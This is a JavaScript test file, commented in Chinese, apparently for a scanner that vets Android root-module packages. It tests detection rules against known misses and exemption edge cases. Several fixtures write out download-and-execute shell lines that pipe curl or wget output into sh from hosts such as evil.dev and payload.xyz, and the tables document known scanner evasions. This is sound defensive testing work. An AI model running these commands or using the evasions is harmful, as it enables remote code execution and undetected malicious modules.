      text: body('    wget -q -T 20 -O /data/local/tmp/payload.sh "$2" 2>/dev/null',
        '    sh /data/local/tmp/payload.sh'),
      isolates: '只把 "$1" 换成可钉住的字面路径 ⇒ 链说话 ⇒ 沉默的原因只能是位置参数' },
    build: () => ({ id: 'eval.t7km3', files: [
      ['fetch.sh', body('    wget -q -T 20 -O "$1" "$2" 2>/dev/null', '    sh "$1"')],
    ]}),
    measured: 'low / auto-approve，0 findings（EXEC_INDIRECT 也不认 sh "$1"：$1 不是标识符）',
  },
  {
    id: 'KM-4',
    name: '下载 zip → 解压 → 执行其中解出来的脚本（跨条目一跳，逐字 Integrity-Box sh "$CUSTOMIZE_SH"）',
    closesWhen: '出现 sink→解包→执行 的连线规则（计划 §0.18 明写「是另一条规则的量级」，本轮没有它）',
    expect: 'rule-silent-sibling-carries',
    // ⚠ 与工单 §2 的残账清单**不一致**（报告 §三第 2 条）：这条链本身确实没被任何规则连线
    //   （DOWNLOAD_THEN_EXEC 实测 0），但整包今天被 EXEC_INDIRECT/high 顶住 ⇒ high/block。
    probe: { ruleId: 'DOWNLOAD_THEN_EXEC', file: 'customize.sh', expectCount: 0 },
    control: { ruleId: 'DOWNLOAD_THEN_EXEC', file: 'customize.sh', expectCount: 1,
      text: body('ZIP_PATH="/storage/emulated/0/Download/Canary.zip"',
        '    curl -L --fail -o "$ZIP_PATH" "$URL" 2>/dev/null',
        '    unzip -o "$ZIP_PATH" -d "$OUT_DIR" >/dev/null 2>&1',
        'sh "$ZIP_PATH"'),
      isolates: '把执行目标从解出来的路径换成**下载物本身**的可钉路径 ⇒ 链说话 ⇒ 缺的那一跳正是「解出来的脚本」' },
    build: () => ({ id: 'eval.t7km4', files: [
      ['customize.sh', body(
        'URL="https://github.com/x/y/releases/download/archive/Canary.zip"',
        'OUT_DIR="/storage/emulated/0/Download/IntegrityModules"',
        'ZIP_PATH="$OUT_DIR/Canary.zip"',
        'CUSTOMIZE_SH="$OUT_DIR/customize.sh"',
        '    DOWNLOADER=$(command -v curl); DL_MODE="curl"; return',
        '            "$DOWNLOADER" -L --fail -o "$ZIP_PATH" "$URL" 2>/dev/null',
        '    unzip -o "$ZIP_PATH" -d "$OUT_DIR" >/dev/null 2>&1',
        'sh "$CUSTOMIZE_SH"')],
    ]}),
    measured: '规则层 DOWNLOAD_THEN_EXEC=0；整包 EXEC_INDIRECT/high@9 ⇒ high / block',
  },
  {
    id: 'KM-5',
    name: '跨文件链：A 文件下载、B 文件执行同一路径',
    closesWhen: '出现跨文件连线（本轮所有链规则都是 per-file，逐行工厂装不下这句话）',
    expect: 'auto-approve',
    probe: { ruleId: 'DOWNLOAD_THEN_EXEC', file: 'customize.sh', expectCount: 0,
      text: body('sh /data/local/tmp/stage2.sh') },
    control: { ruleId: 'DOWNLOAD_THEN_EXEC', file: 'service.sh', expectCount: 1,
      text: body('curl -s -o /data/local/tmp/stage2.sh http://10.0.0.8/a',
        'chmod 700 /data/local/tmp/stage2.sh',
        'sh /data/local/tmp/stage2.sh'),
      isolates: '同样的三行放进**同一个文件** ⇒ 链说话 ⇒ 沉默的原因只能是「换了个文件」' },
    build: () => ({ id: 'eval.t7km5', files: [
      ['service.sh', body('curl -s -o /data/local/tmp/stage2.sh http://10.0.0.8/a', 'chmod 700 /data/local/tmp/stage2.sh')],
      ['customize.sh', body('sh /data/local/tmp/stage2.sh')],
    ]}),
    measured: 'low / auto-approve（只有 HARDCODED_IP/low + NETWORK_FETCH/low 两条背景噪声）',
  },
  {
    id: 'KM-6',
    name: 'T3.4-E1：缩进 `curl)` 标签后面接真管道（豁免新开的那条逃逸道）',
    closesWhen: '「标签后面再出现下载器就翻回命中」被实现 ⇒ 代价是 T3.4-B1/B3 那格误报重新开（工单 §3 两侧同形）',
    expect: 'auto-approve',
    probe: { ruleId: 'PIPE_TO_SHELL', file: 'service.sh', expectCount: 0 },
    control: { ruleId: 'PIPE_TO_SHELL', file: 'service.sh', expectCount: 1,
      text: body('    curl -s https://evil.dev/x | sh ;;'),
      isolates: '只把 `curl)` 这个标签摘掉 ⇒ 1/high ⇒ 沉默的原因只能是标签豁免，不是缩进' },
    build: () => ({ id: 'eval.t7km6', files: [
      ['service.sh', body('    curl) curl -s https://evil.dev/x | sh ;;')],
    ]}),
    measured: 'low / auto-approve（既有夹具 T3.4-E1 钉的就是这一格）',
  },
  {
    id: 'KM-7',
    name: 'io.github.foo.ml：`io` 前缀反向 DNS 名留在 medium（已知残留 FP，不是漏检）',
    closesWhen: 'REVERSE_DNS_RESERVED_LABEL 收进 io/dev/me/xyz ⇒ 这一格掉到 info ⇒ 同时送出一条「改个包名前缀就能换 info」的门（P10 §2 明令不许）',
    expect: 'fp-stays-medium',
    // ⚠ 与工单 §2 那句「它的期望是『不抬等级』」**不一致**（报告 §三第 3 条）：实测它**确实抬了等级**
    //   —— severity medium ⇒ counts.medium=1 ⇒ riskLevel medium ⇒ decide 给 block。
    //   这条残留的方向是假阳性（人工税），不是漏检；工单也写了它「性质与别的条目不同」。
    //   期望值按实测写：medium。谁把它降到 info，这一条就红 —— 那是一次**放宽**，正该被记账。
    probe: { ruleId: 'SUSPICIOUS_DOMAIN', file: 'webroot/index.js', expectCount: 1, expectSeverity: 'medium' },
    control: { ruleId: 'SUSPICIOUS_DOMAIN', file: 'webroot/index.js', expectCount: 1, expectSeverity: 'info',
      text: 'const PKG = "com.github.foo.ml";\n',
      isolates: '只把首段 io 换成保留字 com ⇒ 同一行同一引号形状掉到 info ⇒ 抬等级的原因只能是词表那八个' },
    build: () => ({ id: 'eval.t7km7', files: [
      ['webroot/index.js', 'const PKG = "io.github.foo.ml";\n'],
    ]}),
    measured: 'medium / auto-approve（2026-10-21 换轴实测；换轴前是「medium / block（残留 FP：无害的反向 DNS 名换不来包名豁免）」）'
      + '—— 等级仍是 medium、SUSPICIOUS_DOMAIN/medium 那条残账照旧在报告面上，换的是它不再拦上架。',
  },
  {
    id: 'KM-8',
    name: 'aidepro.top：P10 接受的税（逐字 Yuri/clear_all_detection_traces.sh:51）',
    closesWhen: '给它补一条锚点（判据变化），或把 info 那一支改成 null/low（那就是删证据或改档，都该红）',
    expect: 'info-only',
    // ⚠ 这条**不是误报修复**，是本轮认下的代价：那是一份「清理检测痕迹」脚本里的外部域名，
    //   本来就该被看见，但三条紧邻锚点都不成立、首段又不是保留字 ⇒ 「无取用上下文 ⇒ info」。
    //   它落 info ⇒ 不抬等级 ⇒ 整包 low/auto-approve：这就是 §2.6「投稿者把 C2 塞进非 URL 形状换 info」的税。
    probe: { ruleId: 'SUSPICIOUS_DOMAIN', file: 'service.sh', expectCount: 1, expectSeverity: 'info' },
    control: { ruleId: 'SUSPICIOUS_DOMAIN', file: 'service.sh', expectCount: 1, expectSeverity: 'medium',
      text: body('    remove_path "/storage/emulated/0/Android/data/aidepro.top/x"'),
      isolates: '同一串后面紧跟 /path（强锚点②）⇒ medium ⇒ 降级的原因只能是「没有取用上下文」' },
    build: () => ({ id: 'eval.t7km8', files: [
      ['service.sh', body('    remove_path "/storage/emulated/0/Android/data/aidepro.top"')],
    ]}),
    measured: 'low / auto-approve，counts.info=1，证据仍在 report.findings 里',
  },
];

// 这张表声明的 id 清单（清单不变量吃的就是这一份字面量 —— 与数组分开放，删条目的人必须同时改这里）。
const KNOWN_MISS_IDS = Object.freeze([
  'KM-1', 'KM-2', 'KM-3', 'KM-4', 'KM-5', 'KM-6', 'KM-7', 'KM-8',
]);

function assertKnownMissShape(row) {
  assert.ok(row.id && row.name && row.build, `${row.id} 缺 id/name/build`);
  assert.ok(typeof row.closesWhen === 'string' && row.closesWhen.trim().length > 0,
    `${row.id} 的 closesWhen 为空：写了漏检却没写「什么改动算把它补上」= 这条永远不会被关掉`);
  assert.ok(['auto-approve', 'info-only', 'not-blocked', 'rule-silent-sibling-carries', 'fp-stays-medium']
    .includes(row.expect), `${row.id} 的 expect 不在词表里：${row.expect}`);
  assert.ok(row.probe, `${row.id} 必须有规则级探针（否则它可能是一句空话）`);
  assert.ok(row.control && row.control.text, `${row.id} 必须有活体对照：没有对照就证明不了沉默的原因是这一格`);
}

for (const row of KNOWN_MISS) {
  test(`T7-KM ${row.id} 仍漏着：${row.name}`, async () => {
    assertKnownMissShape(row);
    // (1) 规则层：本条形状在自己的规则上今天的实际命中数（漏检的那一半在这里显形）。
    const probeText = row.probe.text != null ? row.probe.text : row.build().files[0][1];
    const got = probe(row.probe.ruleId, row.probe.file, probeText);
    assert.equal(got.length, row.probe.expectCount,
      `${row.id}：${row.probe.ruleId} 在 ${row.probe.file} 上实测 ${JSON.stringify(probeRead(got))}，`
      + `期望 ${row.probe.expectCount} —— 数字变了就说明这一格已经不是残账`);
    if (row.probe.expectSeverity) {
      assert.equal(got[0].severity, row.probe.expectSeverity,
        `${row.id}：severity 实测 ${JSON.stringify(probeRead(got))}，期望 ${row.probe.expectSeverity}`);
    }
    // (2) 活体对照：只改那一件事，规则必须立刻说话（或立刻掉档）—— 证明洞的位置，不证明别的。
    const ctl = probe(row.control.ruleId, row.control.file, row.control.text);
    assert.equal(ctl.length, row.control.expectCount,
      `${row.id} 的活体对照失效：${row.control.isolates}\n  实测 ${JSON.stringify(probeRead(ctl))}`);
    if (row.control.expectSeverity) {
      assert.equal(ctl[0].severity, row.control.expectSeverity,
        `${row.id} 的活体对照档位不对：${row.control.isolates} ⇒ 实测 ${JSON.stringify(probeRead(ctl))}`);
    }
    // (3) 整包：今天的实际结论。补上洞的人必须在这里被拦住。
    const r = await run(row);
    switch (row.expect) {
      case 'auto-approve':
        assert.equal(r.decision.action, 'auto-approve',
          `${row.id}：残账断的是「今天落自动通道」；实测 ${r.riskLevel}/${r.decision.action} ${JSON.stringify(spots(r))}`);
        assert.equal(r.riskLevel, 'low', `${row.id}：实测等级漂了：${JSON.stringify(r.counts)}`);
        break;
      case 'not-blocked':
        assert.notEqual(r.decision.action, 'block',
          `${row.id}：这一格只该走人工，不该被拦住；实测 ${r.decision.action}`);
        break;
      case 'info-only': {
        const hits = r.findings.filter((f) => f.ruleId === row.probe.ruleId);
        assert.equal(hits.length, 1, `${row.id}：证据必须还在报告面上：${JSON.stringify(spots(r))}`);
        assert.equal(hits[0].severity, 'info', `${row.id}：降级漂了：${JSON.stringify(hits[0])}`);
        assert.equal(countsTowardRisk(hits[0]), false, `${row.id}：info 计入定级 = 这一档被改掉`);
        assert.equal(r.counts.info, 1, `${row.id}：counts.info 应当吃这一笔：${JSON.stringify(r.counts)}`);
        assert.equal(r.decision.action, 'auto-approve',
          `${row.id}：info 不抬等级 ⇒ 整包今天仍是 ${r.riskLevel}/${r.decision.action}`);
        break;
      }
      case 'rule-silent-sibling-carries': {
        assert.equal(r.decision.action, 'block',
          `${row.id}：整包今天由兄弟规则顶住 ⇒ block；漂了就说明这一格的定性要重写：${JSON.stringify(spots(r))}`);
        const sibling = r.findings.filter((f) => f.ruleId !== row.probe.ruleId && countsTowardRisk(f));
        assert.ok(sibling.length > 0, `${row.id}：找不到顶住整包的那条兄弟规则：${JSON.stringify(spots(r))}`);
        assert.deepEqual(spotOf(r, row.probe.ruleId), [],
          `${row.probe.ruleId} 不许在这一格说话（它一说话这条残账就关上了）`);
        break;
      }
      case 'fp-stays-medium': {
        assert.equal(r.riskLevel, 'medium', `${row.id}：FP 残留的等级漂了：${JSON.stringify(r.counts)}`);
        // 2026-10-21 换轴接线：旧期望是 `action === 'block'`（medium ⇒ 走人工）。
        // 这一条残账说的是「假阳性仍在等级里」，而换轴之后「在等级里」不再等于「不上架」：
        // HARDCODED_IP / NETWORK_FETCH 这类背景噪声不在拦截名单里（§3.2 ③：一切 medium 归标注）
        // ⇒ 今天落 auto-approve，但读数必须在 annotation 里点名，读者仍然看得见它。
        assert.equal(r.decision.action, 'auto-approve',
          `${row.id}：medium 残留现在是标注不是拦截；实测 ${r.decision.action}`);
        assert.ok(annotated(r).length > 0, `${row.id}：降成标注后 annotation 是空的 ⇒ 静默：${JSON.stringify(r.annotation)}`);
        break;
      }
      default: assert.fail(`${row.id}：expect 未实现：${row.expect}`);
    }
  });
}

// ---------------------------------------------------------------------------
// 表三 NARROWING_WITNESSES —— 每一处收窄/降级/豁免的「它没有溢出」证人
// 这张表是本轮真正的增量（计划里没有）。它防的不是「洞没补」，而是
// 「放宽的那一手越出了它自己声明的那一行」—— A1 的 M5 正是这种滑动，
// 而当时仓库里所有旧夹具 fail=0 全绿，只有两条新增的看得见（task-a1-report.md §六.5）。
// ---------------------------------------------------------------------------

const NARROWING_WITNESSES = [
  {
    id: 'NW-1',
    name: 'A1 官方形状豁免 ⇒ 引用照旧解析（载荷伪装成 customize.sh，只能靠模板行进面）',
    closesWhen: '把豁免套进 resolveBundledRefs（= A1 的变异 M5，本轮常驻化），或引用解析开始看 severity',
    build: () => ({ id: 'eval.t7nw1', files: [
      [UB, UB_TPL],
      ['customize.sh', DISGUISED],
    ]}),
    check: (r) => {
      // 前提先钉死（不是口头主张）：这个条目不在那五个桶里、也过不了 Task 4 的可打印比例
      // ⇒ 它进扫描面的**唯一**一条路就是模板行那条引用。前提不成立时这一格就是空转。
      const cls = classify(readZip(makeModuleZip({ id: 'eval.t7nw1prem', files: [
        [UB, UB_TPL],
        ['customize.sh', DISGUISED],
      ]})).files);
      assert.deepEqual(cls.canonical.map((f) => f.name), [],
        '前提：伪装成 customize.sh 的载荷没进 canonical（可撤销面）');
      assert.deepEqual(cls.binaries.map((f) => f.name), ['customize.sh'],
        '前提：它落 binaries ⇒ 只能靠引用升级进面');
      assert.ok(printableRatio(DISGUISED) < POLYGLOT_MIN_PRINTABLE,
        `前提：Task 4 的 polyglot 通道不许接住它（${printableRatio(DISGUISED).toFixed(4)} < ${POLYGLOT_MIN_PRINTABLE}）`);
      assert.deepEqual(r.polyglotFed.map((e) => e.name), [], '前提在报告面上的读数：它没进 feed');
      assert.ok(r.escalated.length === 1 && r.escalated[0].resolvedEntry === 'customize.sh'
        && r.escalated[0].fromFile === UB && r.escalated[0].fromLine === 2,
        `模板行必须照样把被引用的条目拉进扫描面：${JSON.stringify(r.escalated)}`);
      assert.ok(r.scripts.some((s) => s.name === 'customize.sh'),
        `扫描面不许因为这条豁免而缩小：${JSON.stringify(r.scripts.map((s) => s.name))}`);
      assert.deepEqual(spotOf(r, 'PIPE_TO_SHELL'), ['high@customize.sh:2'],
        '载荷必须由它自己那一行说话：' + JSON.stringify(spots(r)));
      assert.deepEqual(spotOf(r, 'EXEC_BUNDLED_FILE'), [`info@${UB}:2`],
        '呈现降了，证据没删，落点还在模板行那一个字节上：' + JSON.stringify(spots(r)));
      assert.equal(r.riskLevel, 'high', 'M5 的形状是整包从 high 掉到 medium ⇒ 等级就是这条证人的读数');
    },
    measured: 'high / block，escalated 1 笔，PIPE_TO_SHELL/high@customize.sh:2，EXEC_BUNDLED_FILE/info',
  },
  {
    id: 'NW-2',
    name: 'A1 官方形状豁免 ⇒ 撤销记账照旧（常规形状：customize.sh 是明文，本来就在可撤销面上）',
    closesWhen: '豁免把撤销证人一起关掉（revokedBundledRefs 变空 ⇒ fix8-E 那道闸失效），或 low+first 又恢复自动放行',
    build: () => ({ id: 'eval.t7nw2', files: [
      [UB, UB_TPL],
      ['customize.sh', body('ui_print "- clean"')],
    ]}),
    check: (r) => {
      assert.deepEqual(revokedOf(r), [`EXEC_BUNDLED_FILE@${UB}:2->customize.sh`],
        '模板行仍然产生撤销证人 —— 豁免没有把记账一起关掉：' + JSON.stringify(r.revokedBundledRefs));
      assert.equal(r.riskLevel, 'low');
      assert.notEqual(r.decision.action, 'auto-approve',
        '有撤销就不许自动放行（Task 2.8）：这一格是 A1 与 2.8 的接缝，豁免不许把它抹平');
      assert.equal(r.decision.action, 'request-review', `实测 ${r.decision.action}`);
    },
    measured: 'low / request-review，revokedBundledRefs 1 笔，0 findings',
  },
  {
    id: 'NW-3',
    name: 'P10 两条 info 分支（包名 / 无锚点）⇒ 证据仍在 report.findings，不写 null',
    closesWhen: 'severityFor 的第 4 或第 6 步返回 null（删证据 = A1 的 M3 同款方向），或 info 被改成 low（改档）',
    // 两个 info 分支各占一行：V5 变异实测过一支单独摘掉时另一支照样绿 ⇒ 这一格必须两行都在，
    // 否则「P10 降 severity 不删证据」只有一半证人（本轮第一次跑 V5 就是这么暴露的，照实记）。
    build: () => ({ id: 'eval.t7nw3', files: [
      ['service.sh', body(
        'package = "com.tencent.tmgp.cf"',
        '    remove_path "/storage/emulated/0/Android/data/aidepro.top"')],
    ]}),
    check: (r) => {
      const hits = r.findings.filter((f) => f.ruleId === 'SUSPICIOUS_DOMAIN');
      assert.equal(hits.length, 2,
        `两条 info 分支都必须留在报告面上（少一条就是那一支被写成了 null）：${JSON.stringify(spots(r))}`);
      assert.deepEqual(hits.map((f) => `${f.severity}@${f.line}`).sort(), ['info@2', 'info@3'],
        `降级档位漂了：${JSON.stringify(hits.map((f) => `${f.severity}@${f.line}`))}`);
      for (const f of hits) {
        assert.equal(countsTowardRisk(f), false, 'info 不计入定级是 P10 的两条契约之一');
      }
      assert.equal(countsTowardRisk({ severity: 'low' }), true,
        'info 与 low 不是一档：把降级写成 low 就是给这条证据抬了一档（A1-C1 的同一句话，这里再钉一次）');
      assert.equal(r.counts.info, 2, `counts.info 该吃这两笔（证据变少也是红）：${JSON.stringify(r.counts)}`);
      assert.equal(r.riskLevel, 'low', `整包等级不该被这两条抬起：${JSON.stringify(r.counts)}`);
    },
    measured: 'low / auto-approve，SUSPICIOUS_DOMAIN/info 两笔都在 findings，counts.info=2',
  },
  {
    id: 'NW-4',
    name: 'P10 info 那一支 ⇒ 不许把同行 medium 那一支带走（工厂「全行取最严」在这里要有见证）',
    closesWhen: 'makeLineRule 退回「只看第一个匹配」（fix3-P7 那个病），或 info 那一支抢先返回',
    build: () => ({ id: 'eval.t7nw4', files: [
      // info 那一支写在**前面**：旧实现只取第一个匹配，就会把后面的真 URL 压成 info。
      ['service.sh', body('    remove_path "/storage/emulated/0/Android/data/aidepro.top"; curl https://payload.xyz/drop')],
    ]}),
    check: (r) => {
      const hits = r.findings.filter((f) => f.ruleId === 'SUSPICIOUS_DOMAIN');
      assert.equal(hits.length, 1, '基数契约：一条规则一行最多一条发现：' + JSON.stringify(spots(r)));
      assert.equal(hits[0].severity, 'medium',
        `全行取最严 ⇒ medium；掉到 info 就说明 info 那一支把整行判了：${JSON.stringify(hits[0])}`);
      assert.equal(hits[0].snippet, 'payload.xyz',
        'snippet 必须指名产生结论的那个匹配，不许是最左那个：' + JSON.stringify(hits[0]));
      assert.equal(r.riskLevel, 'medium');
    },
    measured: 'medium / auto-approve（换轴实测，原 medium / block），1 条 SUSPICIOUS_DOMAIN/medium，snippet=payload.xyz',
  },
  {
    id: 'NW-5',
    name: 'T3.4 case 标签前瞻豁免 ⇒ 同行真管道不许被豁免带走',
    closesWhen: 'CASE_LABEL_GUARD 从「紧跟 `)`」放宽成「行内任意位置有 `)`」（豁免外溢 ⇒ 缩进真管道再次沉默）',
    build: () => ({ id: 'eval.t7nw5', files: [
      ['service.sh', body('    curl -s https://x.dev/a -o /dev/null (echo) | sh')],
    ]}),
    check: (r) => {
      assert.deepEqual(spotOf(r, 'PIPE_TO_SHELL'), ['high@service.sh:2'],
        '`)` 不紧跟下载器 ⇒ 豁免不许咬这一格：' + JSON.stringify(spots(r)));
      assert.equal(r.decision.action, 'block');
    },
    measured: 'high / block（T3.4-A6 那一格的整包版本）',
  },
  {
    id: 'NW-6',
    name: 'T4 polyglot 进 feed ⇒ 不进 coveredSurface（§0.13 那一格，T4-B3 归表）',
    closesWhen: 'resolveBundledRefs 的第 5 实参被改成 scanTargets（feed 顶掉 covered ⇒ 「在 feed 里」被当成「读过且无罪」），或可打印判据被放宽到这个条目',
    build: () => ({ id: 'eval.t7nw6', files: [
      ['customize.sh', body('sh $MODPATH/assets/payload.bin')],
      ['assets/payload.bin', POLYGLOT],
    ]}),
    check: (r) => {
      assert.deepEqual(r.revokedBundledRefs, [],
        '一笔撤销都不许发生：有撤销就说明「进过 feed」被当成了「读过且无罪」：' + JSON.stringify(revokedOf(r)));
      assert.deepEqual(spotOf(r, 'EXEC_BUNDLED_FILE'), ['high@customize.sh:2'],
        '那条 high 必须留着 —— 它说「执行的是包内条目」，与 feed 无关：' + JSON.stringify(spots(r)));
      assert.deepEqual(escalatedOf(r), ['customize.sh:2->assets/payload.bin'],
        '它靠引用升级进面这一笔账不许被 polyglot 那一步顶掉或记两遍');
      assert.deepEqual(r.polyglotFed.map((e) => e.name), [], '已在 feed 上的条目不重复记账');
      assert.equal(r.riskLevel, 'high');
    },
    measured: 'high / block，revokedBundledRefs=[]，escalated 1 笔',
  },
  {
    id: 'NW-7',
    name: 'Task 2.7/2.8 撤销记账 ⇒ 有撤销就不许自动放行',
    closesWhen: 'decide 不再吃 coverage.revokedCount（fix8-E 那道闸被摘），或撤销不再被记账',
    build: () => ({ id: 'eval.t7nw7', files: [
      ['customize.sh', body('sh $MODPATH/lib/helper.sh')],
      ['lib/helper.sh', body('echo ok')],
    ]}),
    check: (r) => {
      assert.deepEqual(r.findings, [], '夹具本身必须干净：被撤销掉之后报告面上 0 条发现');
      assert.deepEqual(revokedOf(r), ['EXEC_BUNDLED_FILE@customize.sh:2->lib/helper.sh'],
        '撤销这笔账必须在（它不在就说明记账层被摘了）：' + JSON.stringify(r.revokedBundledRefs));
      assert.equal(r.riskLevel, 'low');
      assert.equal(r.changeType, 'first', '前提：首次收录 —— 这一档正是自动通道的那一格');
      assert.equal(r.decision.action, 'request-review',
        '「机器替它作过证」就不能同时是自动放行的理由：' + JSON.stringify(r.decision));
      assert.match(r.decision.reason, /机器不替它作证/, `决策理由必须指名道姓：${r.decision.reason}`);
    },
    measured: 'low / request-review，0 findings，revokedBundledRefs 1 笔',
  },
  {
    id: 'NW-8',
    name: 'Task 2.7 名单外文本被读掉 ⇒ 但撤销不掉 EXEC_BUNDLED_FILE/high',
    closesWhen: 'coveredSurface 被改成 scanTargets（= 「会在 feed 里」被当成「在可撤销面上」），撤销把这条 high 撤走',
    build: () => ({ id: 'eval.t7nw8', files: [
      ['customize.sh', body('sh $MODPATH/conf.json')],
      ['conf.json', body('echo hi')],
    ]}),
    check: (r) => {
      assert.ok(r.scripts.some((s) => s.name === 'conf.json'),
        '名单外条目确实被读进了内容扫描面（feed）：' + JSON.stringify(r.scripts.map((s) => s.name)));
      assert.deepEqual(r.revokedBundledRefs, [],
        '读过 ≠ 读过且无罪：可撤销面只认那五个桶 ⇒ 这一笔撤销不该发生');
      assert.deepEqual(spotOf(r, 'EXEC_BUNDLED_FILE'), ['high@customize.sh:2'],
        '那条 high 必须还在，且不许被 feed 撤走：' + JSON.stringify(spots(r)));
      // 2026-10-21 换轴接线（旧期望：`action === 'block'`）：这一发的读数一条不落全在，
      // 变的是「high 不再等于不上架」——EXEC_BUNDLED_FILE 按 §3.2 ② 归能力/覆盖轴。
      // §3.1 那条边界就点名了这一发：「NW-8 那发（sh $MODPATH/conf.json，被执行的条目内容干净）
      // 今天由它单独顶住，新模型下上架 —— **那一发本身该上**」。
      // 牙留着的地方：那条 high 不许消失，而且它必须在 annotation 里点名（不许静默）。
      assert.equal(r.decision.action, 'auto-approve',
        `实测 ${r.decision.action}：EXEC_BUNDLED_FILE 不在拦截名单里 ⇒ 上架 + 标注`);
      assert.ok(annotated(r).includes('EXEC_BUNDLED_FILE'),
        `能力读数必须还在标注里：annotation=${JSON.stringify(r.annotation)}`);
    },
    measured: 'high / auto-approve（2026-10-21 换轴实测；换轴前是「high / block（conf.json 在 scripts 里，revokedBundledRefs 仍为空）」）'
      + '—— conf.json 在 scripts 里、revokedBundledRefs 仍为空这两件事一字未变。',
  },
];

for (const row of NARROWING_WITNESSES) {
  test(`T7-NW ${row.id} 只影响呈现：${row.name}`, async () => {
    assert.ok(typeof row.closesWhen === 'string' && row.closesWhen.trim().length > 0,
      `${row.id} 的 closesWhen 为空`);
    const r = await run(row);
    row.check(r);
  });
}

const NARROWING_IDS = Object.freeze([
  'NW-1', 'NW-2', 'NW-3', 'NW-4', 'NW-5', 'NW-6', 'NW-7', 'NW-8',
]);
const REGRESSION_IDS = Object.freeze([
  'REG-01', 'REG-02', 'REG-03', 'REG-04', 'REG-05', 'REG-06', 'REG-07', 'REG-08',
  'REG-09', 'REG-10', 'REG-11', 'REG-12',
]);

// ---------------------------------------------------------------------------
// 清单不变量（工单 §4 步 3 那两条；本轮把 id 对账扩到三张表）
// 防的是「为了让套件绿而把测试删掉」这个动作本身。
// ---------------------------------------------------------------------------

test('T7-INV-1 清单不变量：KNOWN_MISS 的 id 集合逐字等于声明表（删条目/改 id/合并条目都会红在这里）', () => {
  const ids = KNOWN_MISS.map((x) => x.id);
  assert.deepEqual(ids, [...KNOWN_MISS_IDS],
    `残账清单漂了：数组里是 ${JSON.stringify(ids)}，声明表是 ${JSON.stringify([...KNOWN_MISS_IDS])}。`
    + ' 要关掉一条残账，正确做法是把它挪进 REGRESSION 并同步这份字面量，不是删掉它。');
  assert.equal(new Set(ids).size, ids.length, '残账 id 不许重复（重复合并 = 少一条）');
});

test('T7-INV-2 清单不变量：三张表每一项的 closesWhen 都非空（写了漏检却没写「什么改动算补上」= 永远关不掉）', () => {
  const all = [['REGRESSION', REGRESSION], ['KNOWN_MISS', KNOWN_MISS], ['NARROWING_WITNESSES', NARROWING_WITNESSES]];
  for (const [table, rows] of all) {
    assert.ok(rows.length > 0, `${table} 空了 —— 空表罩得住真 bug，这条本轮已栽过两次`);
    for (const row of rows) {
      assert.ok(typeof row.closesWhen === 'string' && row.closesWhen.trim().length >= 8,
        `${table}/${row.id} 的 closesWhen 缺失或短到说不出改动：${JSON.stringify(row.closesWhen)}`);
      assert.ok(typeof row.name === 'string' && row.name.length > 0, `${table}/${row.id} 缺 name`);
      assert.equal(typeof row.build, 'function', `${table}/${row.id} 的 build 不是函数`);
    }
  }
});

test('T7-INV-3 清单不变量：REGRESSION 与 NARROWING_WITNESSES 的 id 集合也逐字对账', () => {
  assert.deepEqual(REGRESSION.map((x) => x.id), [...REGRESSION_IDS],
    '表一的清单漂了 —— 表一删一条就等于把一次已付过学费的修复从常驻证明里拿掉');
  assert.deepEqual(NARROWING_WITNESSES.map((x) => x.id), [...NARROWING_IDS],
    '表三的清单漂了 —— 每一处收窄都必须留着它的证人');
});

test('T7-INV-4 三张表互不重叠，且每条 KNOWN_MISS 的 expect 都在词表内、都带活体对照', () => {
  const a = new Set(REGRESSION.map((x) => x.id));
  const b = new Set(KNOWN_MISS.map((x) => x.id));
  const c = new Set(NARROWING_WITNESSES.map((x) => x.id));
  for (const [x, other] of [[a, b], [a, c], [b, c]]) {
    for (const id of x) assert.equal(other.has(id), false, `id 在两张表里同时出现：${id}`);
  }
  for (const row of KNOWN_MISS) {
    assertKnownMissShape(row);
    assert.ok(row.control.isolates && row.control.isolates.length > 8,
      `${row.id} 的活体对照必须写清它隔离的是哪一件事：${JSON.stringify(row.control.isolates)}`);
  }
});

test('T7-INV-5 口径钉子：scoreRisk 返回对象，不许整颗喂给 decide()', () => {
  // 工单 §4 步 2 的那个坑（上一轮主控这样得到过一份全 block 的假数据）：
  // decide(level, ...) 吃的是**字符串**。把对象递进去，level 那一档永远不等于 'low'，
  // 于是所有包都「被拦住」—— 一张全绿的假表。这条钉子住这张表自己的读数方式。
  const sample = [{ ruleId: 'X', severity: 'medium', file: 'a.sh', line: 1 }];
  const score = scoreRisk(sample);
  assert.equal(typeof score, 'object');
  assert.equal(score.level, 'medium');
  assert.equal(decide(score, 'first').action, 'block', '整颗对象喂给 decide ⇒ 永远不是 low ⇒ 假绿');
  assert.equal(decide(score.level, 'first').action, 'block', '正确用法同样 block，但走的是 .level');
  assert.equal(decide('low', 'first').action, 'auto-approve');
  assert.equal(countsTowardRisk({ severity: 'info' }), false);
});
